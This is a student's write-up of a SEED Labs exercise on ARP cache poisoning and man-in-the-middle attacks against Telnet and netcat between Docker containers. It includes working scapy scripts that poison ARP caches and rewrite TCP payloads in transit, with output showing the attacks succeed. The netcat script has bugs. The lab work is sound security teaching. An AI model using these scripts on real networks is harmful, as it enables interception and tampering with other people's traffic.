### Network Config
```shell
M - 10.9.0.105 - 02:42:0a:09:00:69
A - 10.9.0.5   - 02:42:0a:09:00:05
B - 10.9.0.6   - 02:42:0a:09:00:06
```

### Script to populate correct ARP tables:
```python3
#!/usr/bin/env python3
from scapy.all import *

M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")

def parse(content):
    if content.lower() == "a":
        return A_mac, A_ip
    elif content.lower() == "b":
        return B_mac, B_ip
    else:
        return M_mac, M_ip

dst = "A"
src = "B"

dst_mac, dst_ip = parse(dst)
src_mac, src_ip = parse(src)

E = Ether(dst=dst_mac, src=src_mac)

A = ARP()
A.op = 1 #1 for ARP request; 2 for ARP reply
A.hwsrc = src_mac
A.psrc = src_ip
A.hwdst = dst_mac
A.pdst = dst_ip

arp_req = E/A
print(f"sending {src_ip}|{src_mac} to {dst_ip}|{dst_mac}")
sendp(arp_req)
```

## Task 1: ARP Cache Poisoning
### Docker Config
```shell
seed@VM:~$ dockps
e09f8cbbb9d3  M-10.9.0.105
b744fccdd43d  A-10.9.0.5
642ee46d1bf4  B-10.9.0.6
```

### 1.A using ARP request
On the attack host (M), we need to construct an ARP request packet to map host B's IP address to M's MAC address. We then need to send that packet to host A. 

Now let's create our python scapy script:
```python3
#!/usr/bin/env python3
from scapy.all import *

M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")

#sending ethernet packet from host M to host A
E = Ether(dst=A_mac, src=M_mac)

A = ARP()
A.op = 1 #1 for ARP request; 2 for ARP reply
#we want host A to associate host B's IP address with host M's MAC address
#so we need to send an ARP binding like (M_mac, B_ip)
A.hwsrc = M_mac
A.psrc = B_ip
#we're sending this ARP request to host A
A.hwdst = A_mac
A.pdst = A_ip

arp_req = E/A
sendp(arp_req)
```

```shell
root@e09f8cbbb9d3:/volumes# python3 1a.py 
.
Sent 1 packets.
```

Now let's hop over to host A and see if it worked:
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```
Beautiful! Host A now cached that the IP address ```10.9.0.6``` (host B) is now bound to the MAC address ```02:42:0a:09:00:69``` (host M)

### 1.B using ARP reply
On host M, we need to construct an ARP reply packet to map host B's IP address to host M's MAC address. We then need to send this packet to host A.
#### Scenario 1: B's IP is already in A's cache
First we need to make sure host A's ARP table has the correct mapping for host B. We can do so by altering our previous script to send genuine source and destination IP and MAC addresses from host B to host A. The script I used to do that is linked at the top of the writeup. Let's check to see if host A has the correct mapping:

```shell
root@b744fccdd43d:/# arp -n    
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
```
Looks good to me!

The scapy script to send an ARP reply is much the same as the previous task except we change the ARP().op from 1 to 2, indicating an ARP reply. We execute the scapy script on Host M and jump to host A to see the results.
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```
Looks like the ARP reply has overwritten the entry for host B's MAC address!

#### Scenario 2: B's IP is not in A's cache
Let's flush host A's arp cache:
```shell
root@b744fccdd43d:/# arp -d 10.9.0.6
```

Now that the cache is empty, let's run our script again from the attack host and check host A's cache again:
```shell
root@e09f8cbbb9d3:/volumes# python3 1b.py 
.
Sent 1 packets.
```
```shell
root@b744fccdd43d:/# arp -n
root@b744fccdd43d:/# 
```
We've got nothing. Looks like the attack wasn't successful.

### 1.C using ARP gratuitous message
On host M, construct an ARP gratuitous packet and use it to map B's IP address to M's MAC address and launch the attack under the same two scenarios as task 1.B. 

An ARP gratuitous packet is an ARP reply broadcast. The script is as follows:
```python3
#!/usr/bin/env python3
 from scapy.all import *
 
 M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
 A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
 B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")
 broadcast_mac = "ff:ff:ff:ff:ff:ff"
 
 #sending ethernet packet from host M to all hosts on the subnet
 E = Ether(dst=broadcast_mac, src=M_mac)
 
 A = ARP()
 A.op = 2 #1 for ARP request; 2 for ARP reply
 #we want host A to associate host B's IP address with host M's MAC address, so we need to send an ARP binding like (M_mac, B_ip)
 A.hwsrc = M_mac
 A.psrc = B_ip
 #we're sending this ARP request to all hosts on the subnet
 A.hwdst = broadcast_mac
 A.pdst = A_ip
 
 arp_req = E/A
 sendp(arp_req)
```

#### Scenario 1: B's IP is already in A's cache
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0

root@e09f8cbbb9d3:/volumes# python3 1c.py 
.
Sent 1 packets.

root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```
The results look very similar to the previous section, host B's MAC address was overwritten to be host M's.

#### Scenario 2: B's IP is not in A's cache
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0

root@e09f8cbbb9d3:/volumes# python3 1c.py 
.
Sent 1 packets.

root@b744fccdd43d:/# arp -n 
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
```
No cigar, looks like if B's IP address isn't already in the cache, an ARP reply, regardless of broadcast or unicast, won't populate the cache.

## Task 2: MITM Attack on Telnet
### Docker Config
```shell
seed@VM:~/.../volumes$ dockps
965fffded138  M-10.9.0.105
9cd27edc87ad  B-10.9.0.6
ef3a05ea874d  A-10.9.0.5
```

### Task 2.1: Launch the ARP cache poisoning attack
I first ensured that host A had an ARP cache entry for host B and vice versa. Then, I used the following scapy python script to maliciously overwrite the entries with host M's MAC address:
```python3
#!/usr/bin/env python3
from scapy.all import *

M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")
broad_mac = "ff:ff:ff:ff:ff:ff"

#send an ARP request to A associating M's MAC address to B's IP address
E = Ether(dst=A_mac, src=M_mac)
A = ARP()
A.op = 2 #1 for ARP request; 2 for ARP reply
A.hwsrc = M_mac
A.psrc = B_ip
A.hwdst = A_mac
A.pdst = A_ip
sendp(E/A)

#send an ARP request to B associating M's MAC address to A's IP address
E = Ether(dst=B_mac, src=M_mac)
A = ARP()
A.op = 2 #1 for ARP request; 2 for ARP reply
A.hwsrc = M_mac
A.psrc = A_ip
A.hwdst = B_mac
A.pdst = B_ip
sendp(E/A)
```

We can now see the respective ARP tables for hosts A and B:
```shell
root@9cd27edc87ad:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:31:62:85:b3   C                     eth0
10.9.0.5                 ether   02:42:0a:09:00:69   C                     eth0

root@ef3a05ea874d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
10.9.0.1                 ether   02:42:31:62:85:b3   C                     eth0
```

### Task 2.2: Testing
We first turn off ip forwarding for host M. We then send a ping request from A to B. Below is the wireshark packet capture:
![image](https://github.com/user-attachments/assets/02924e41-eb9f-463f-ab87-c1adb7a9bc4f)
In summary, the ping requests fail, and eventually host A sends out an ARP request to host B who replies with their correct ip address, and the pings begin to succeed.

### Task 2.3: Turn on IP Forwarding
After we poison the caches again, we turn on ip forwarding for host M. We then send a ping request from A to B. Below is the wireshark packet capture:
![image](https://github.com/user-attachments/assets/7b509afd-f039-41de-8fdb-534a72657a8c)
We can see that M makes an ARP request for B and begins forwarding the ping requests from A to B and then back from B to A, acting as the man in the middle.

### Task 2.4: Launch the MITM attack
First, we need to establish a telnet connection from host A to host B (which is being forwarded through host M, our middle man)
```shell
root@ef3a05ea874d:/# telnet 10.9.0.6
Trying 10.9.0.6...
Connected to 10.9.0.6.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
9cd27edc87ad login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Oct 16 23:06:56 UTC 2024 from A-10.9.0.5.net-10.9.0.0 on pts/2
seed@9cd27edc87ad:~$ ls
```

With this connection established, we now turn off M's ip forwarding. Doing so completely freezes the telnet session; our service has been denied! Sad.

Now let's get into the actual Man in the Middle Attack. We'll use the following scapy script:
```python3
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if IP in pkt and TCP in pkt:
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # Create a new packet based on the captured one.
            L3 = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            L4 = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
            # Construct the new payload based on the old payload.
            if pkt[TCP].payload:
                data = pkt[TCP].payload.load # The original payload data
                newdata = b"Z"
                newpkt = L3/L4/newdata
                del(newpkt.chksum)
                del(newpkt[TCP].chksum)
                send(newpkt)
                print(f"replaced {data} with {newdata}")
            else:
                send(pkt[IP])
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            newpkt = IP(bytes(pkt[IP]))/TCP(bytes(pkt[TCP]))
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            send(newpkt)

#we only want to spoof packets between hosts A and B, so isolate their respective addresses
f = f'tcp and (ether src {MAC_A} or ether src {MAC_B})'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```
This will alter the data from A to B such that, whatever A inputs will be replaced with the character Z

Let's run the script on host M and see what the telnet experience becomes!
```shell
seed@9cd27edc87ad:~$ whoami
seed
seed@9cd27edc87ad:~$ wZZZZZZ
-bash: wZZZZZZ: command not found
seed@9cd27edc87ad:~$ lZZZ
-bash: lZZZ: command not found
seed@9cd27edc87ad:~$ hZZZZZZpZ
-bash: hZZZZZZpZ: command not found
seed@9cd27edc87ad:~$
```
as we can see, it renders the telnet client unusable. Here's what it looks like in wireshark:
![image](https://github.com/user-attachments/assets/2c1eed7f-66fa-4e75-bfef-a6c24820dbf8)

## Task 3: MITM Attack Against Netcat
This task is to replace every occurrence of my first name in a netcat connection between hosts A and B the with a sequence of A’s. We can use a slightly modified version of task 3's MITM scapy script:
```python3
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
seq_offset = 0

def spoof_pkt(pkt):
    if IP in pkt and TCP in pkt:
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # Create a new packet based on the captured one.
            L3 = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            L4 = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq + seq_offset, ack=pkt[TCP].ack)
            # Construct the new payload based on the old payload.
            if pkt[TCP].payload:
                data = pkt[TCP].payload.load # The original payload data
                if b"daniel" in data.lower().split():
                    idx = data.lower().find(b"daniel")
                    newdata = data[:idx] + b"AAAAAA" + data[idx + len(b"daniel")]
                    print(f"replaced {data} with {newdata}")
                    seq_offset += len(newdata) - len(data)
                    data = newdata
                newpkt = L3/L4/data
                del(newpkt.chksum)
                del(newpkt[TCP].chksum)
                send(newpkt)
            else:
                send(pkt[IP])

#we only want to spoof packets between hosts A and B, so isolate their respective addresses
f = f'tcp and (ether src {MAC_A} or ether src {MAC_B})'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

Let's start up the netcat server on host B and connect from host A. Then we run our script on host M and see what happens to our message
```shell
root@9cd27edc87ad:/# nc -lp 9090

root@ef3a05ea874d:/# nc 10.9.0.6 9090
mmy name is daniel hello
```
![image](https://github.com/user-attachments/assets/40b1c21f-97fc-4da8-8e63-9b5bebca23f7)

Would you look at that! It replaced my name with A's!

## Task 4: Write-Up
This lab helped cement the differences in practicality with ARP requests and ARP responses;
how they serve different purposes when it comes to cache poisoning, whether or not an entry
is sitting in the ARP table already.
The lab also forced me to become at least somewhat familiar with scapy library, of which I had 
only glances with in the past. 

The first section was surprisingly tedious for me; it took a 
bit of time to consistently poison the ARP caches of hosts A and B, or to even register their 
appropriate bindings in their respective ARP caches until I created a small script to make that 
job easier for me. 

I have a higher appreciation for tools like (b)ettercap now. It becomes very tedious to
repeatedly poison caches, as the hosts re-acquire their correct IP:MAC bindings over time.

The lab also improved my tmux skills a decent bit, having to alternate between 4 hosts on
a regular basis would have been a massive pain without it.
